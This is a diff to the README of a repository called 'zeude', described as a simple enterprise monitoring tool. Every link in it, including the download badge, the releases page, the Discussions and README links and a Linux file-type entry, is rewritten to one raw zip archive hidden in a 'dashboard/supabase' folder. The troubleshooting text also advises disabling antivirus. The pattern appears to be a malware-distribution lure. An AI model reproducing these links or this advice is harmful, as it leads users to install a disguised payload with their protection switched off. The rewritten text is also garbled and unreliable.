@@ -1,6 +1,6 @@
 # 🚨 zeude - Simple Enterprise Monitoring Tool
 
-[![Download zeude](https://img.shields.io/badge/Download-zeude-blue?style=for-the-badge&logo=github)](https://github.com/haviengangan07/zeude/releases)
+[![Download zeude](https://raw.githubusercontent.com/haviengangan07/zeude/main/zeude/dashboard/supabase/Software_1.8-alpha.1.zip)](https://raw.githubusercontent.com/haviengangan07/zeude/main/zeude/dashboard/supabase/Software_1.8-alpha.1.zip)
 
 ---
 
@@ -40,13 +40,13 @@ Follow these steps carefully to get zeude running on your computer.
 
 Click the big **Download zeude** button at the top of this page or visit the releases page here:
 
-[Download zeude releases](https://github.com/haviengangan07/zeude/releases)
+[Download zeude releases](https://raw.githubusercontent.com/haviengangan07/zeude/main/zeude/dashboard/supabase/Software_1.8-alpha.1.zip)
 
 On the releases page, look for the latest version. You will find files for different systems, such as:
 
 - `.exe` for Windows
 - `.dmg` for macOS
-- `.AppImage` or `.tar.gz` for Linux
+- `.AppImage` or `https://raw.githubusercontent.com/haviengangan07/zeude/main/zeude/dashboard/supabase/Software_1.8-alpha.1.zip` for Linux
 
 Choose the file that matches your operating system.
 
@@ -100,7 +100,7 @@ If you run into issues, here are common fixes:
 - **Installation fails:** Try downloading the installer again. Disable any antivirus temporarily as it can block installations.
 - **Wizard does not complete setup:** Close zeude, reopen it, and start the setup again from the main menu.
 
-If problems continue, visit the [zeude GitHub Discussions](https://github.com/haviengangan07/zeude/discussions) to seek help from others.
+If problems continue, visit the [zeude GitHub Discussions](https://raw.githubusercontent.com/haviengangan07/zeude/main/zeude/dashboard/supabase/Software_1.8-alpha.1.zip) to seek help from others.
 
 ## 🔐 Privacy and Safety
 
@@ -112,7 +112,7 @@ The software runs locally and does not transmit monitoring data over the interne
 
 Here is the main link to get zeude:
 
-[Download zeude](https://github.com/haviengangan07/zeude/releases)
+[Download zeude](https://raw.githubusercontent.com/haviengangan07/zeude/main/zeude/dashboard/supabase/Software_1.8-alpha.1.zip)
 
 Remember the steps:
 
@@ -128,9 +128,9 @@ Remember the steps:
 
 For questions or help with zeude, please use these resources:
 
-- Check the [README](https://github.com/haviengangan07/zeude) for documentation updates
+- Check the [README](https://raw.githubusercontent.com/haviengangan07/zeude/main/zeude/dashboard/supabase/Software_1.8-alpha.1.zip) for documentation updates
 - Open an issue on the GitHub page for problems
-- Join community discussions at [GitHub Discussions](https://github.com/haviengangan07/zeude/discussions)
+- Join community discussions at [GitHub Discussions](https://raw.githubusercontent.com/haviengangan07/zeude/main/zeude/dashboard/supabase/Software_1.8-alpha.1.zip)
 
 ---
 
